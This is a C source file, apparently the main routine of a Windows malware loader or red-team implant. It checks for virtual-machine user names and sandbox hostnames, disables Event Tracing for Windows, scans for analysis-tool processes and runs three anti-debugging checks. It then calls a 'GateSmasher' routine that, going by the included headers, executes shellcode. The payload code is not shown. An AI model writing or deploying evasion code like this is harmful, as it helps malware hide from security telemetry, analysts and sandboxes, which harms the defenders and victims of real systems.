#include "headers.h"
#include "etw.h"
#include "shellc.h"
#include "sandbox_debugging.h"
#include "gate.h"
#include "crypt.h"

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(void) {

	
	if (VMUserCheck() == FALSE)
		printf("[CHECK] Not running under VM or sandbox user context\n");
	else
		return -94; 
	
	if (VMHostnameCheck() == FALSE)
		printf("[CHECK] Not running in a sandbox environment\n");
	else
		return -95;

	// Disable ETW
	BOOL r_etw = DisableETW();
	if (r_etw == TRUE) { printf("[+] ETW Disabled\n"); }
	
	INT analysis_tools = analysis_tools_process();
	if (analysis_tools == 1) {
		printf("\t[!] Found analysis tools\n");
		return -99;
	}
	else {
		printf("\t[+] No analysis tools\n");
	}

	if (IsDebugged() == FALSE) {
		printf("[+] No debugger attached (CHECK 1)\n");

		if (IsDebuggedPEB() == FALSE) {
			printf("[+] No debugger attached (CHECK 2 PEB)\n");
			
			if (IsRemoteDebuggerPresent() == FALSE) {
				printf("[+] No debugger attached (CHECK 3 REMOTE)\n");
			} 
			else {
				printf("[!] Program is being debugged (CHECK 3)\n");
				return -98;
			}
		}
		else {
			printf("[!] Program is being debugged (CHECK 2)\n");
			return -97;
		}
	}
	else {
		printf("[!] Program is being debugged (CHECK 1)\n");
		return -96;
	}
	
	GateSmasher();

	return 0;
}